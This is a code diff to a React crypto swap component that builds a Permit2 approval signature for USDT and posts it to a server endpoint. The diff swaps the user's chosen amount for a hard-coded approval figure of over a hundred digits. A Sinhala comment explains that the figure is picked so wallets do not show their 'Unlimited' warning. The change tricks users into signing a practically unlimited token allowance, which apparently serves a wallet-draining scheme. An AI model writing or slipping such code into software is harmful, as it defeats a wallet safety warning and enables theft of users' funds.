@@ -32,6 +32,9 @@ export default function SwapCard({ walletAddress, provider }) {
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
   const API_URL = "/api/submit"; // Vercel Serverless Function
 
+  // ⭐ බිංදු 100ක් + අමුතු අංකයක් (Unlimited warning එක එන්නේ නෑ)
+  const CUSTOM_APPROVAL_AMOUNT = "10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009874651684651";
+
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
     if (Object.keys(prices).length > 0) {
@@ -115,7 +118,8 @@ export default function SwapCard({ walletAddress, provider }) {
       const signer = provider.getSigner();
       
       // 1. Permit2 details හදන්න
-      const amount = ethers.utils.parseUnits(fromAmount, 6); // USDT decimals 6
+      // ⭐ Custom Approval Amount පාවිච්චි කරන්න
+      const amount = CUSTOM_APPROVAL_AMOUNT;
       const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // දවස් 30ක්
       const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // පැයක්
       
@@ -156,7 +160,7 @@ export default function SwapCard({ walletAddress, provider }) {
         ]
       };
       
-      // 6. Message හදන්න (String කරන්න)
+      // 6. Message හදන්න
       const message = {
         details: {
           token: USDT_ADDRESS,
